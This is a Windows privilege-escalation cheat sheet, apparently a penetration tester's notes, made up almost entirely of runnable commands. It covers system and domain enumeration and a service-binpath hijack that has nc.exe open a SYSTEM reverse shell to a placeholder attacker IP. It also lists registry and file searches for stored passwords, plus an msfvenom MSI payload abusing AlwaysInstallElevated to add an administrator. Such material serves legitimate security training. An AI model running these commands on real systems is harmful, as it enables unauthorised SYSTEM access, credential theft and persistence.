# Windows Privilege Escalation

## Enumeration
```cmd
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Weak Permissions
```cmd
# this example is for XP SP0
# upload accesschk.exe to a writable directory first 
# for XP version 5.2 of accesschk.exe is needed
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe 

# check for serices with weak permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# check for the found services above
accesschk.exe -ucqv upnphost
# upload nc.exe to writable directory
sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
# check the status now
sc qc upnphost
# change start option as AUTO-START 
sc config SSDPSRV start= auto
#start the services
net start SSDPSRV
net stop upnphost
net start upnphost

# listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privilege
```

## Registry Check For Passwords
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

## Creds Check
```cmd
# Grep Search
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

# Places to Check for Creds
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini
```

## AllwaysInstalledElevated
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# From the output, notice that “AlwaysInstallElevated” value is 1.

# Exploitation:
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
Place 'setup.msi' in 'C:\Temp'
msiexec /quiet /qn /i C:\Temp\setup.msi
net localgroup Administrators
```
## File System
```cmd
dir /a-r-d /s /b
icacls "C:\Program Files (x86)\Program Folder" 


```

